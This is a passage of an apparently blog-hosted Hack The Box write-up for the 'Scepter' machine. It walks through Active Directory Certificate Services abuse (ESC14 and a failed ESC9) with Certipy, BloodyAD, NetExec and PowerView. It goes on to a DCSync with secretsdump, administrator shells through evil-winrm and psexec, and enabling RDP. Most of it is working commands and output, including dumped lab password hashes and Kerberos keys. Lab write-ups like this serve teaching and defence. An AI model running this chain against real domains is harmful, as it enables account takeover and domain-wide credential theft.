[*] Successfully retrieved CA configuration for 'scepter-DC01-CA'  
[*] Checking web enrollment for CA 'scepter-DC01-CA' @ 'dc01.scepter.htb'  
[!] Error checking web enrollment: [Errno 111] Connection refused  
[!] Use -debug to print a stacktrace  
[!] Error checking web enrollment: [Errno 111] Connection refused  
[!] Use -debug to print a stacktrace  
[*] Enumeration output:  
Certificate Authorities  
0  
CA Name : scepter-DC01-CA  
DNS Name : dc01.scepter.htb  
Certificate Subject : CN=scepter-DC01-CA, DC=scepter, DC=htb  
Certificate Serial Number : 716BFFE1BE1CD1A24010F3AD0E350340  
Certificate Validity Start : 2024-10-31 22:24:19+00:00  
Certificate Validity End : 2061-10-31 22:34:19+00:00  
Web Enrollment  
HTTP  
Enabled : False  
HTTPS  
Enabled : False  
User Specified SAN : Disabled  
Request Disposition : Issue  
Enforce Encryption for Requests : Enabled  
Active Policy : CertificateAuthority_MicrosoftDefault.Policy  
Permissions  
Owner : SCEPTER.HTB\Administrators  
Access Rights  
ManageCa : SCEPTER.HTB\Administrators  
SCEPTER.HTB\Domain Admins  
SCEPTER.HTB\Enterprise Admins  
ManageCertificates : SCEPTER.HTB\Administrators  
SCEPTER.HTB\Domain Admins  
SCEPTER.HTB\Enterprise Admins  
Enroll : SCEPTER.HTB\Authenticated Users  
Certificate Templates  
0  
Template Name : StaffAccessCertificate  
Display Name : StaffAccessCertificate  
Certificate Authorities : scepter-DC01-CA  
Enabled : True  
Client Authentication : True  
Enrollment Agent : False  
Any Purpose : False  
Enrollee Supplies Subject : False  
Certificate Name Flag : SubjectAltRequireEmail  
SubjectRequireDnsAsCn  
SubjectRequireEmail  
Enrollment Flag : AutoEnrollment  
NoSecurityExtension  
Extended Key Usage : Client Authentication  
Server Authentication  
Requires Manager Approval : False  
Requires Key Archival : False  
Authorized Signatures Required : 0  
Schema Version : 2  
Validity Period : 99 years  
Renewal Period : 6 weeks  
Minimum RSA Key Length : 2048  
Template Created : 2024-11-01T02:29:00+00:00  
Template Last Modified : 2024-11-01T09:00:54+00:00  
Permissions  
Enrollment Permissions  
Enrollment Rights : SCEPTER.HTB\staff  
Object Control Permissions  
Owner : SCEPTER.HTB\Enterprise Admins  
Full Control Principals : SCEPTER.HTB\Domain Admins  
SCEPTER.HTB\Local System  
SCEPTER.HTB\Enterprise Admins  
Write Owner Principals : SCEPTER.HTB\Domain Admins  
SCEPTER.HTB\Local System  
SCEPTER.HTB\Enterprise Admins  
Write Dacl Principals : SCEPTER.HTB\Domain Admins  
SCEPTER.HTB\Local System  
SCEPTER.HTB\Enterprise Admins  
[+] User Enrollable Principals : SCEPTER.HTB\staff  
[!] Vulnerabilities  
ESC9 : Template has no security extension.  
[*] Remarks  
ESC9 : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
```

If you take a closer look at the results, you’ll notice the certificate template named **flag** doesn’t have a **UPN** (User Principal Name) defined. That means it’s not vulnerable to **ESC9**, since UPN is one of the key indicators we look for in that escalation path. But the closest alternative to ESC9 is **ESC14**, which relies on the `SubjectAltRequireEmail` property. And guess what? That attribute *is* present in the **flag** template. The only user that satisfies this condition is **h.brown**. If you want to verify that, you can run an LDAP query using **NetExec** to enumerate all users and check their email attributes you’ll see it clearly there.

> “ESC14 Scenario A: Write altSecurityIdentities on Target The attacker has write access to altSecurityIdentities on the target. The attacker can enroll a certificate as a victim principal and add an explicit certificate mapping referring to this certificate in the altSecurityIdentities attribute of the target. Then, the attacker can use the certificate to authenticate as the target.”

**ESC14** is a certificate template abuse technique where an attacker with control over a user’s `mail` attribute can request a certificate containing a different user's email (usually through `altSecurityIdentities`). If the certificate template allows it, and the CA doesn't enforce proper restrictions, the issued certificate can be used to authenticate as the target user effectively impersonating them via certificate-based authentication.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/scepter]  
└─# nxc ldap dc01.scepter.htb -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce --query "(&(objectClass=user)(altSecurityIdentities=*))" "samaccountname altSecurityIdentities memberOf"  
  
LDAP 10.10.11.65 389 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:scepter.htb) (signing:None) (channel binding:Never)  
LDAP 10.10.11.65 389 DC01 [+] scepter.htb\d.baker:18b5fb0d99e7a475316213c15b6f22ce  
LDAP 10.10.11.65 389 DC01 [+] Response for object: CN=h.brown,CN=Users,DC=scepter,DC=htb  
LDAP 10.10.11.65 389 DC01 memberOf CN=CMS,CN=Users,DC=scepter,DC=htb  
LDAP 10.10.11.65 389 DC01 CN=Helpdesk Admins,CN=Users,DC=scepter,DC=htb  
LDAP 10.10.11.65 389 DC01 CN=Protected Users,CN=Users,DC=scepter,DC=htb  
LDAP 10.10.11.65 389 DC01 CN=Remote Management Users,CN=Builtin,DC=scepter,DC=htb  
LDAP 10.10.11.65 389 DC01 sAMAccountName h.brown  
LDAP 10.10.11.65 389 DC01 altSecurityIdentities X509:<RFC822>h.brown@scepter.htb
```

And you can see it by BloodyAD too

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/scepter]  
└─# bloodyAD --host dc01.scepter.htb -d scepter.htb -u a.carter -p 'Maverick123!' get object h.brown --attr altSecurityIdentities  
  
distinguishedName: CN=h.brown,CN=Users,DC=scepter,DC=htb  
altSecurityIdentities: X509:<RFC822>h.brown@scepter.htb
```

so what can we actually do here? what’s the attack path? i know it seems a bit sophisticated, but let’s break it down.
 i can reset **a.carter**’s password using the `ForceChangePassword` from **d.baker**. once i’ve got control over **a.carter**, i can use their rights to modify **d.baker**’s `mail` attribute and set it to match **h.brown**’s.
 then, since **d.baker** can enroll in the StaffAccessCertificate template, and that template uses `SubjectAltRequireEmail`, i can request a cert as **d.baker **but it’ll get issued with **h.brown**'s identity.
 use that cert, boom login as **h.brown**, get a TGT, dump his NTLM. easy.

![](https://cdn-images-1.medium.com/max/800/1*tPh7B2bnKr5hVXWSE5Jn5Q.png)

1. So first, I reset the password of a.carter since we have ForceChangePassword rights over the account.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/scepter]  
└─# bloodyAD --host dc01.scepter.htb -d "scepter.htb" -u d.baker -p ':18b5fb0d99e7a475316213c15b6f22ce' set password "a.carter" 'Maverick123!'  
[+] Password changed successfully!
```

2. Now I can abuse the GenericAll permission over the StaffAccessCertificates OU and you know the only user in tha OUis d.baker

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/scepter]  
└─# bloodyAD --host dc01.scepter.htb -d scepter.htb -u a.carter -p 'Maverick123!' add genericAll "OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB" a.carter  
[+] a.carter has now GenericAll on OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB
```

3. Now we’ll modify d.baker’s email to match h.brown’s using BloodyAD as well.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/scepter]  
└─# bloodyAD --host dc01.scepter.htb -d scepter.htb -u a.carter -p 'Maverick123!' set object d.baker mail -v h.brown@scepter.htb  
[+] d.baker's mail has been updated
```

4. Now I can request a certificate as d.baker, since everything is set and the StaffAccessCertificate template is vulnerable.

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/scepter/writeup]  
└─# certipy req -username d.baker@scepter.htb -hashes :18b5fb0d99e7a475316213c15b6f22ce -target dc01.scepter.htb -ca scepter-DC01-CA -template StaffAccessCertificate -dc-ip 10.10.11.65  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[*] Requesting certificate via RPC  
[*] Request ID is 12  
[*] Successfully requested certificate  
[*] Got certificate without identity  
[*] Certificate has no object SID  
[*] Try using -sid to set the object SID or see the wiki for more details  
[*] Saving certificate and private key to 'd.baker.pfx'  
[*] Wrote certificate and private key to 'd.baker.pfx'
```

If you wanna check what email is tied to d.baker, you can use OpenSSL to view the certificate and surprise, it’ll show h.brown. You can think of it like email impersonation or spoofing, something along those lines.

![](https://cdn-images-1.medium.com/max/800/1*K2yA1R2iu9B1dWd7278__A.png)

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/scepter/writeup]  
└─# ntpdate 10.10.11.65 |certipy -debug auth -pfx d.baker.pfx -dc-ip 10.10.11.65 -domain scepter.htb -username h.brown  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[+] Target name (-target) and DC host (-dc-host) not specified. Using domain '' as target name. This might fail for cross-realm operations  
[+] Nameserver: '10.10.11.65'  
[+] DC IP: '10.10.11.65'  
[+] DC Host: ''  
[+] Target IP: '10.10.11.65'  
[+] Remote Name: '10.10.11.65'  
[+] Domain: ''  
[+] Username: 'H.BROWN'  
[*] Certificate identities:  
[*] No identities found in this certificate  
[!] Could not find identity in the provided certificate  
[*] Using principal: 'h.brown@scepter.htb'  
[*] Trying to get TGT...  
[+] Sending AS-REQ to KDC scepter.htb (10.10.11.65)  
[*] Got TGT  
[*] Saving credential cache to 'h.brown.ccache'  
[+] Attempting to write data to 'h.brown.ccache'  
File 'h.brown.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): [+] Using alternative filename: 'h.brown_49939c86-2a8e-4940-9f75-264f871a9d21.ccache'  
[+] Data written to 'h.brown_49939c86-2a8e-4940-9f75-264f871a9d21.ccache'  
[*] Wrote credential cache to 'h.brown_49939c86-2a8e-4940-9f75-264f871a9d21.ccache'  
[*] Trying to retrieve NT hash for 'h.brown'  
[*] Got hash for 'h.brown@scepter.htb': aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c
```

In this scenario, when dealing with Kerberos on Linux, you always gotta check and update your `krb5.conf` file to set the attacking domain — that usually fixes any Kerberos issues. So yeah, let’s log in now

with sudo then put it in /etc/krb5.conf

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/scepter]  
└─# nxc smb dc01.scepter.htb --generate-krb5-file scepter.krb5  
SMB 10.10.11.65 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True)  
(SMBv1:False)
```

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/scepter/writeup]  
└─# KRB5CCNAME=h.brown.ccache nxc winrm scepter.htb -u h.brown -H 4ecf5242092c6fb8c360a08069c75a0c  
WINRM 10.10.11.65 5985 DC01 [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:scepter.htb)  
WINRM 10.10.11.65 5985 DC01 [-] scepter.htb\h.brown:4ecf5242092c6fb8c360a08069c75a0c  
  
┌──(root㉿kali)-[/home/…/Desktop/htb/scepter/writeup]  
└─# KRB5CCNAME=h.brown.ccache evil-winrm -i dc01.scepter.htb -r scepter.htb  
  
Evil-WinRM shell v3.7  
  
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline  
  
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
  
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\h.brown\Documents>
```

![](https://cdn-images-1.medium.com/max/800/0*JdaILQh_u8YnRQfx.gif)

*Hell yeah, it’s time to take some well-deserved rest*

**After getting initial access, it’s time for privilege escalation.** In Active Directory, one of the first things I *always* check is **DACL permissions**.
 Using BloodHound, we already know that `h.brown` doesn’t have any outbound relationships but he's a member of some **juicy groups**. The most interesting ones? `CMS` and `Helpdesk Admins`.

So, I decided to go old-school and use **PowerView**. There are two ways to do this:

- The **silly way**: `Find-InterestingDomainACLs` — it's slow, noisy, and takes forever.
- The **smart way**: `Get-DomainObjectAcl` with `ResolveGUIDs` — this one’s a gem I picked up from **HTB Academy**.

And of course, if you’re a modern red teamer, you should also check out **BloodyAD** because, well… why not make privilege escalation a little more bloody?

```powershell
*Evil-WinRM* PS C:\Users\h.brown\documents> upload pv.ps1  
  
Info: Uploading /home/kali/Desktop/htb/scepter/pv.ps1 to C:\Users\h.brown\documents\pv.ps1  
  
Data: 1206040 bytes of 1206040 bytes copied  
  
Info: Upload successful!  
  
*Evil-WinRM* PS C:\Users\h.brown\documents> import-module ./pv.ps1  
*Evil-WinRM* PS C:\Users\h.brown\documents> $cms = ConvertTo-Sid "CMS"  
*Evil-WinRM* PS C:\Users\h.brown\documents> $helpdesk = ConvertTo-Sid "HELPDESK ADMINS"  
*Evil-WinRM* PS C:\Users\h.brown\documents> Get-DomainObjectACL -ResolveGUIDs -Identity * | ?{($_.SecurityIdentifier -eq $cms) -or ($_.SecurityIdentifier -eq $helpdesk)}  
  
  
  
AceQualifier : AccessAllowed  
ObjectDN : CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb  
ActiveDirectoryRights : WriteProperty🥷🥷🥷🥷🥷📜⭐  
ObjectAceType : Alt-Security-Identities📌📌📌  
ObjectSID : S-1-5-21-74879546-916818434-740295365-1109  
InheritanceFlags : ContainerInherit  
BinaryLength : 72  
AceType : AccessAllowedObject  
ObjectAceFlags : ObjectAceTypePresent, InheritedObjectAceTypePresent  
IsCallback : False  
PropagationFlags : None  
SecurityIdentifier : S-1-5-21-74879546-916818434-740295365-1601  
AccessMask : 32  
AuditFlags : None  
IsInherited : True  
AceFlags : ContainerInherit, Inherited  
InheritedObjectAceType : User  
OpaqueLength : 0  
  
AceQualifier : AccessAllowed  
ObjectDN : CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb  
ActiveDirectoryRights : ReadProperty  
ObjectAceType : All  
ObjectSID : S-1-5-21-74879546-916818434-740295365-1109  
InheritanceFlags : ContainerInherit  
BinaryLength : 56  
AceType : AccessAllowedObject  
ObjectAceFlags : InheritedObjectAceTypePresent  
IsCallback : False  
PropagationFlags : None  
SecurityIdentifier : S-1-5-21-74879546-916818434-740295365-1601  
AccessMask : 16  
AuditFlags : None  
IsInherited : True  
AceFlags : ContainerInherit, Inherited  
InheritedObjectAceType : User  
OpaqueLength : 0  
  
AceQualifier : AccessAllowed  
ObjectDN : OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb  
ActiveDirectoryRights : WriteProperty  
ObjectAceType : Alt-Security-Identities  
ObjectSID :  
InheritanceFlags : ContainerInherit  
BinaryLength : 72  
AceType : AccessAllowedObject  
ObjectAceFlags : ObjectAceTypePresent, InheritedObjectAceTypePresent  
IsCallback : False  
PropagationFlags : InheritOnly  
SecurityIdentifier : S-1-5-21-74879546-916818434-740295365-1601  
AccessMask : 32  
AuditFlags : None  
IsInherited : False  
AceFlags : ContainerInherit, InheritOnly  
InheritedObjectAceType : User  
OpaqueLength : 0  
  
AceQualifier : AccessAllowed  
ObjectDN : OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb  
ActiveDirectoryRights : ReadProperty  
ObjectAceType : All  
ObjectSID :  
InheritanceFlags : ContainerInherit  
BinaryLength : 56  
AceType : AccessAllowedObject  
ObjectAceFlags : InheritedObjectAceTypePresent  
IsCallback : False  
PropagationFlags : InheritOnly  
SecurityIdentifier : S-1-5-21-74879546-916818434-740295365-1601  
AccessMask : 16  
AuditFlags : None  
IsInherited : False  
AceFlags : ContainerInherit, InheritOnly  
InheritedObjectAceType : User  
OpaqueLength : 0  
  
AceType : AccessAllowed  
ObjectDN : OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb  
ActiveDirectoryRights : GenericExecute  
OpaqueLength : 0  
ObjectSID :  
InheritanceFlags : None  
BinaryLength : 36  
IsInherited : False  
IsCallback : False  
PropagationFlags : None  
SecurityIdentifier : S-1-5-21-74879546-916818434-740295365-1601  
AccessMask : 131076  
AuditFlags : None  
AceFlags : None  
AceQualifier : AccessAllowed
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/scepter]  
└─# KRB5CCNAME=h.brown.ccache bloodyAD --host dc01.scepter.htb -d scepter.htb -k get writable  
  
distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=scepter,DC=htb  
permission: WRITE  
  
distinguishedName: CN=h.brown,CN=Users,DC=scepter,DC=htb  
permission: WRITE  
  
distinguishedName: CN=p.adams,OU=Helpdesk Enrollment Certificate,DC=scepter,DC=htb  
permission: WRITE

```

And yup the **CMS group** has special access over the `altSecurityIdentities` property.
 Remember this scenario? Yeah, it’s the *final boss* one.
 Now if I change **h.brown's** email to match **p.adam**’s email, I can basically grab a **Kerberos ticket for p.adam**.
 Easy impersonation win. 🎯

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/scepter]  
└─# KRB5CCNAME=h.brown.ccache bloodyAD --host DC01.scepter.htb -d scepter.htb -k set object p.adams altSecurityI  
dentities -v 'X509:<RFC822>mav@scepter.htb'  
[+] p.adams's altSecurityIdentities has been updated
```

Now I’m replacing **d.baker**’s email to be **p.adam**.

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/scepter]  
└─# bloodyAD --host dc01.scepter.htb -d scepter.htb -u a.carter -p 'Maverick123!' set object d.baker mail -v mav@scepter.htb  
[+] d.baker's mail has been updated
```

It’s time to request the certificate as **d.baker** to authenticate as **p.adam** — let the impersonation magic begin

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/scepter]  
└─# certipy req -username d.baker@scepter.htb -hashes :18b5fb0d99e7a475316213c15b6f22ce -target dc01.scepter.htb -ca scepter-DC01-CA -template StaffAccessCertificate -dc-ip 10.10.11.65  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[*] Requesting certificate via RPC  
[*] Request ID is 7  
[*] Successfully requested certificate  
[*] Got certificate without identity  
[*] Certificate has no object SID  
[*] Try using -sid to set the object SID or see the wiki for more details  
[*] Saving certificate and private key to 'd.baker.pfx'  
[*] Wrote certificate and private key to 'd.baker.pfx'  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/scepter]  
└─# certipy auth -pfx d.baker.pfx -dc-ip 10.10.11.65 -domain scepter.htb -username p.adams  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[*] Certificate identities:  
[*] No identities found in this certificate  
[!] Could not find identity in the provided certificate  
[*] Using principal: 'p.adams@scepter.htb'  
[*] Trying to get TGT...  
[*] Got TGT  
[*] Saving credential cache to 'p.adams.ccache'  
[*] Wrote credential cache to 'p.adams.ccache'  
[*] Trying to retrieve NT hash for 'p.adams'  
[*] Got hash for 'p.adams@scepter.htb': aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0
```

```bash
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/scepter]  
└─# KRB5CCNAME=p.adams.ccache nxc smb DC01.scepter.htb --use-kcache  
  
SMB DC01.scepter.htb 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)  
SMB DC01.scepter.htb 445 DC01 [-] Error checking if user is admin on DC01.scepter.htb: The NETBIOS connection with the remote host timed out.  
SMB DC01.scepter.htb 445 DC01 [+] SCEPTER.HTB\p.adams from ccache  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/scepter]  
└─# nxc smb DC01.scepter.htb -u p.adams -H 1b925c524f447bb821a8789c4b118ce0  
SMB 10.10.11.65 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.65 445 DC01 [+] scepter.htb\p.adams:1b925c524f447bb821a8789c4b118ce0
```

**DCsync Time Let’s Steal the Crown**

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/scepter]  
└─# nxc smb DC01.scepter.htb -u p.adams -H 1b925c524f447bb821a8789c4b118ce0  
  
SMB 10.10.11.65 445 DC01 [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)  
SMB 10.10.11.65 445 DC01 [+] scepter.htb\p.adams:1b925c524f447bb821a8789c4b118ce0  
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/scepter]  
└─# impacket-secretsdump scepter.htb/p.adams@DC01.scepter.htb -hashes :1b925c524f447bb821a8789c4b118ce0 -no-pass  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies  
  
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied  
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)  
[*] Using the DRSUAPI method to get NTDS.DIT secrets  
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a291ead3493f9773dc615e66c2ea21c4:::  
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::  
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c030fca580038cc8b1100ee37064a4a9:::  
scepter.htb\d.baker:1106:aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce:::  
scepter.htb\a.carter:1107:aad3b435b51404eeaad3b435b51404ee:2e24650b1e4f376fa574da438078d200:::  
scepter.htb\h.brown:1108:aad3b435b51404eeaad3b435b51404ee:4ecf5242092c6fb8c360a08069c75a0c:::  
scepter.htb\p.adams:1109:aad3b435b51404eeaad3b435b51404ee:1b925c524f447bb821a8789c4b118ce0:::  
scepter.htb\e.lewis:2101:aad3b435b51404eeaad3b435b51404ee:628bf1914e9efe3ef3a7a6e7136f60f3:::  
scepter.htb\o.scott:2102:aad3b435b51404eeaad3b435b51404ee:3a4a844d2175c90f7a48e77fa92fce04:::  
scepter.htb\M.clark:2103:aad3b435b51404eeaad3b435b51404ee:8db1c7370a5e33541985b508ffa24ce5:::  
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:0a4643c21fd6a17229b18ba639ccfd5f:::  
[*] Kerberos keys grabbed  
Administrator:aes256-cts-hmac-sha1-96:cc5d676d45f8287aef2f1abcd65213d9575c86c54c9b1977935983e28348bcd5  
Administrator:aes128-cts-hmac-sha1-96:bb557b22bad08c219ce7425f2fe0b70c  
Administrator:des-cbc-md5:f79d45bf688aa238  
krbtgt:aes256-cts-hmac-sha1-96:5d62c1b68af2bb009bb4875327edd5e4065ef2bf08e38c4ea0e609406d6279ee  
krbtgt:aes128-cts-hmac-sha1-96:b9bc4dc299fe99a4e086bbf2110ad676  
krbtgt:des-cbc-md5:57f8ef4f4c7f6245  
scepter.htb\d.baker:aes256-cts-hmac-sha1-96:6adbc9de0cb3fb631434e513b1b282970fdc3ca089181991fb7036a05c6212fb  
scepter.htb\d.baker:aes128-cts-hmac-sha1-96:eb3e28d1b99120b4f642419c99a7ac19  
scepter.htb\d.baker:des-cbc-md5:2fce8a3426c8c2c1  
scepter.htb\a.carter:aes256-cts-hmac-sha1-96:5a793dad7f782356cb6a741fe73ddd650ca054870f0c6d70fadcae162a389a71  
scepter.htb\a.carter:aes128-cts-hmac-sha1-96:f7643849c000f5a7a6bd5c88c4724afd  
scepter.htb\a.carter:des-cbc-md5:d607b098cb5e679b  
scepter.htb\h.brown:aes256-cts-hmac-sha1-96:5779e2a207a7c94d20be1a105bed84e3b691a5f2890a7775d8f036741dadbc02  
scepter.htb\h.brown:aes128-cts-hmac-sha1-96:1345228e68dce06f6109d4d64409007d  
scepter.htb\h.brown:des-cbc-md5:6e6dd30151cb58c7  
scepter.htb\p.adams:aes256-cts-hmac-sha1-96:0fa360ee62cb0e7ba851fce9fd982382c049ba3b6224cceb2abd2628c310c22f  
scepter.htb\p.adams:aes128-cts-hmac-sha1-96:85462bdef70af52770b2260963e7b39f  
scepter.htb\p.adams:des-cbc-md5:f7a26e794949fd61  
scepter.htb\e.lewis:aes256-cts-hmac-sha1-96:1cfd55c20eadbaf4b8183c302a55c459a2235b88540ccd75419d430e049a4a2b  
scepter.htb\e.lewis:aes128-cts-hmac-sha1-96:a8641db596e1d26b6a6943fc7a9e4bea  
scepter.htb\e.lewis:des-cbc-md5:57e9291aad91fe7f  
scepter.htb\o.scott:aes256-cts-hmac-sha1-96:4fe8037a8176334ebce849d546e826a1248c01e9da42bcbd13031b28ddf26f25  
scepter.htb\o.scott:aes128-cts-hmac-sha1-96:37f1bd1cb49c4923da5fc82b347a25eb  
scepter.htb\o.scott:des-cbc-md5:e329e37fda6e0df7  
scepter.htb\M.clark:aes256-cts-hmac-sha1-96:a0890aa7efc9a1a14f67158292a18ff4ca139d674065e0e4417c90e5a878ebe0  
scepter.htb\M.clark:aes128-cts-hmac-sha1-96:84993bbad33c139287239015be840598  
scepter.htb\M.clark:des-cbc-md5:4c7f5dfbdcadba94  
DC01$:aes256-cts-hmac-sha1-96:4da645efa2717daf52672afe81afb3dc8952aad72fc96de3a9feff0d6cce71e1  
DC01$:aes128-cts-hmac-sha1-96:a9f8923d526f6437f5ed343efab8f77a  
DC01$:des-cbc-md5:d6923e61a83d51ef  
[*] Cleaning up...
```

**Logged in as **`Administrator`** Now I Run This Kingdom**

![](https://cdn-images-1.medium.com/max/800/0*Qc5JxBoChGsb9wSm.gif)

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/scepter]  
└─# evil-winrm -i DC01.scepter.htb -u administrator -H a291ead3493f9773dc615e66c2ea21c4  
  
Evil-WinRM shell v3.7  
  
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline  
  
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
  
Info: Establishing connection to remote endpoint  
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami  
scepter\administrator  
*Evil-WinRM* PS C:\Users\Administrator\Document
```

---

### Beyond the Root I’ts ESC9 Time

If you’ve read any of my write-ups before, you already know I *love* enabling RDP and going *beyond the root*! Why stop at getting SYSTEM when we can peek behind the curtain and see **why** an attack works, or even better, **why it fails**. I like digging into the Domain Controller settings to understand the *real mechanics* behind the attack paths.

So, are you ready to explore that with me?

First things first let’s log in using **PsExec**, which, yes, is one of the most detectable lateral movement techniques out there. But hey, we’re not on a red team op right now we’re breaking into a Hack The Box machine, so let’s just *have fun* with it.

I’ll change the password for `Administrator`, flip some registry keys to enable RDP, and then... it's *deep dive* time. I want to check why **ESC9** failed in this case and figure out how to get it working again.

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/scepter/test]  
└─# impacket-psexec -hashes ':a291ead3493f9773dc615e66c2ea21c4' 'scepter.htb/Administrator'@dc01.scepter.htb  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies  
  
[*] Requesting shares on dc01.scepter.htb.....  
[*] Found writable share ADMIN$  
[*] Uploading file llhBNLtF.exe  
[*] Opening SVCManager on dc01.scepter.htb.....  
[*] Creating service rJRY on dc01.scepter.htb.....  
[*] Starting service rJRY.....  
[!] Press help for extra shell commands  
Microsoft Windows [Version 10.0.17763.7131]  
(c) 2018 Microsoft Corporation. All rights reserved.  
  
C:\Windows\system32> netsh advfirewall firewall set rule group="remote desktop" new enable=Yes  
  
  
Updated 3 rule(s).  
Ok.  
C:\Windows\system32> net user administrator Maverick123!  
The command completed successfully.  
  
C:\Windows\system32> reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f  
  
The operation completed successfully.
```

```bash
  
┌──(root㉿kali)-[/home/kali/Desktop/htb/scepter]  
└─# xfreerdp3 /v:10.10.11.65 /u:administrator /p:'Maverick123!' /dynamic-resolution
```

After opening the RDP session, search for **“Certificate Authority”** from the Start menu and open it. In the left panel, click on **“Certificate Templates”** and then hit **“Manage”** to open the Certificate Template Console.

From there, scroll down and find the `StaffAccessCertificate` template. Right-click it, go to **"Properties"**, and let's inspect what's really going on under the hood.

![](https://cdn-images-1.medium.com/max/800/1*4e-t7Mq3gpwK1paq_Aekwg.png)

> Remember: ESC9 (Enterprise Security Certificate abuse #9) requires that the target certificate template includes a UPN (User Principal Name) in the subject alternative name (SAN). However, if you check the StaffAccessCertificate template here, you'll notice there’s no UPN field configured — which means ESC9 will fail in this case.

![](https://cdn-images-1.medium.com/max/800/1*rDkdkNT3EOcEIJ-_Q2Gokw.png)

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/scepter]  
└─# bloodyAD --host dc01.scepter.htb -d "scepter.htb" -u d.baker -p ':18b5fb0d99e7a475316213c15b6f22ce' set password "a.carter" 'Maverick123!'  
[+] Password changed successfully!
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/scepter]  
└─# bloodyAD --host dc01.scepter.htb -d scepter.htb -u a.carter -p 'Maverick123!' add genericAll "OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB" a.carter  
[+] a.carter has now GenericAll on OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/scepter]  
└─# certipy account -u a.carter -p 'Maverick123!' -dc-ip 10.10.11.65 -upn administrator -user d.baker update  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[*] Updating user 'd.baker':  
userPrincipalName : administrator  
[*] Successfully updated 'd.baker'
```

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/scepter]  
└─# certipy req -username d.baker@scepter.htb -hashes :18b5fb0d99e7a475316213c15b6f22ce -target dc01.scepter.htb -ca scepter-DC01-CA -template StaffAccessCertificate -dc-ip 10.10.11.65  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[*] Requesting certificate via RPC  
[*] Request ID is 18  
[-] Got error while requesting certificate: code: 0x80094812 - CERTSRV_E_SUBJECT_EMAIL_REQUIRED - The email name is unavailable and cannot be added to the Subject or Subject Alternate name.  
Would you like to save the private key? (y/N): y  
[*] Saving private key to '18.key'  
[*] Wrote private key to '18.key'  
[-] Failed to request certificate
```

![](https://cdn-images-1.medium.com/max/800/1*XYfsTW37ENBZpGCudQA_Uw.png)

![](https://cdn-images-1.medium.com/max/800/1*gomVPK_eVJi63jSOsmHFRQ.png)

